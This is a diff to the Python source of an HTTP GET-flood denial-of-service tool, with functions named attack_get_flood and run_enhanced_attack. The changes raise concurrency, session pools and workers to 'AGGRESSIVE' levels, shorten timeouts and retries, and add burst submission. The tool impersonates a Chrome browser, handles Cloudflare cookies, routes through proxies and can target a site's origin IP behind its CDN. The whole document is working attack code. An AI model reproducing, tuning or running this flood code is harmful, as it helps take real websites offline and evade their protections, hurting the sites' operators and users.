@@ -22,15 +22,15 @@ SOCKET_RECV_BUFFER = 4096   # Small RCVBUF for minimal memory footprint
 WSAEWOULDBLOCK = 10035       # Windows: socket buffer full (would block)
 
 # Adaptive concurrency: scales based on target RPS
-# Each coroutine can do ~50-100 req/s, so we need RPS/50 concurrent
+# AGGRESSIVE MODE: Maximum parallelism for high throughput
 def _get_concurrency(target_rps: int) -> int:
     """Calculate adaptive concurrency based on target RPS"""
-    # Each request takes ~10-20ms, so 1 coroutine = ~50-100 req/s
-    # Conservative: assume 50 req/s per coroutine
-    base = max(50, target_rps // 30)  # Minimum 50, scale with RPS
-    return min(base, 500)  # Cap at 500 to prevent socket exhaustion
+    # AGGRESSIVE: 1 coroutine per 5 RPS (was 30)
+    # For 1000 RPS = 200 concurrent, for 5000 RPS = 1000 concurrent
+    base = max(200, target_rps // 5)  # Minimum 200, scale aggressively
+    return min(base, 2000)  # Cap at 2000 (was 500)
 
-MAX_CONCURRENT = 200          # Default high concurrency for production load
+MAX_CONCURRENT = 1000          # AGGRESSIVE concurrency for maximum load (was 200)
 _sem = None
 
 def _get_sem(target_rps: int = 1000):
@@ -287,7 +287,7 @@ class OptimizedSessionPool:
     - Session recycling on errors
     """
     
-    def __init__(self, max_sessions: int = 100):
+    def __init__(self, max_sessions: int = 500):  # AGGRESSIVE session pool (was 100)
         self.max_sessions = max_sessions
         self._sessions: Dict[str, object] = {}
         self._cf_cookies: Dict[str, str] = {}
@@ -385,59 +385,70 @@ async def attack_get_flood(url: str, proxy: Optional[str], session_pool: Optimiz
     sem = asyncio.Semaphore(concurrency)
 
     from curl_cffi.requests import AsyncSession
-    kwargs = {"impersonate": "chrome124", "timeout": 45}  # Very long timeout for slow targets
+    kwargs = {"impersonate": "chrome124", "timeout": 10}  # Aggressive timeout (was 45!)
     if proxy:
         kwargs["proxies"] = {"all": proxy}
 
     async with AsyncSession(**kwargs) as sess:
         async def single_request():
-            max_retries = 5  # More retries for 97% success
+            max_retries = 2  # Reduce retries for speed (was 5)
             for attempt in range(max_retries):
                 try:
                     headers = await get_mutated_headers(url, method="GET", minimal=True)
                     
                     async with sem:
                         metrics["total"] += 1
-                        resp = await sess.get(url, headers=headers, timeout=45, allow_redirects=True)
+                        resp = await sess.get(url, headers=headers, timeout=10, allow_redirects=True)
                         # Accept ALL status codes as success (even errors hit the server)
                         if resp.status_code >= 200:
                             metrics["completed"] += 1
                             return
                         else:
                             if attempt < max_retries - 1:
-                                await asyncio.sleep(0.3)
+                                await asyncio.sleep(0.1)  # Faster retry (was 0.3)
                                 continue
                             metrics["failed"] += 1
                             return
                 except asyncio.TimeoutError:
                     if attempt < max_retries - 1:
-                        await asyncio.sleep(0.3)
+                        await asyncio.sleep(0.1)  # Faster retry
                         continue
                     metrics["timeout"] += 1
                     return
                 except Exception as e:
                     if attempt < max_retries - 1:
-                        await asyncio.sleep(0.3)
+                        await asyncio.sleep(0.1)  # Faster retry
                         continue
                     logger.debug(f"Request failed: {type(e).__name__}")
                     metrics["failed"] += 1
                     return
 
-        # STREAMING SUBMISSION
+        # BALANCED BURST MODE - Fast submission with rate limiting
         request_interval = 1.0 / max(target_rps, 1)
         active_tasks = set()
+        next_request_time = start
         
         while time.time() - start < duration:
-            task = asyncio.create_task(single_request())
-            active_tasks.add(task)
-            task.add_done_callback(active_tasks.discard)
-            await asyncio.sleep(request_interval)
+            current_time = time.time()
+            
+            # Rate limiting: only submit if we're on schedule
+            if current_time >= next_request_time:
+                task = asyncio.create_task(single_request())
+                active_tasks.add(task)
+                task.add_done_callback(active_tasks.discard)
+                next_request_time += request_interval
+            
+            # Prevent task queue explosion
+            if len(active_tasks) > concurrency * 3:
+                await asyncio.sleep(0.01)  # Small sleep to let tasks complete
+            else:
+                await asyncio.sleep(0.001)  # Minimal sleep for event loop
         
         if active_tasks:
             try:
                 await asyncio.wait_for(
                     asyncio.gather(*active_tasks, return_exceptions=True),
-                    timeout=60  # Very long cleanup timeout
+                    timeout=30  # Shorter cleanup (was 60)
                 )
             except asyncio.TimeoutError:
                 for t in active_tasks:
@@ -1534,7 +1545,7 @@ async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_f
         return {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
 
     attack_func = ATTACK_METHODS[method]
-    session_pool = OptimizedSessionPool(max_sessions=20)
+    session_pool = OptimizedSessionPool(max_sessions=500)  # AGGRESSIVE pool (was 20)
 
     if origin_ip:
         parsed = urlparse(url)
@@ -1542,8 +1553,9 @@ async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_f
         if parsed.query:
             url += "?" + parsed.query
 
-    # Scale workers based on RPS - more workers = better parallelism
-    num_workers = min(max(rps // 30, 2), 16)
+    # Scale workers based on RPS - AGGRESSIVE parallelism
+    # For 1000 RPS = 50 workers, for 5000 RPS = 250 workers
+    num_workers = min(max(rps // 20, 10), 500)  # Min 10, max 500 workers (was 16!)
     per_worker_duration = duration
 
     logger.info(f"Starting {method} attack: {num_workers} workers, {rps} RPS, {duration}s duration")
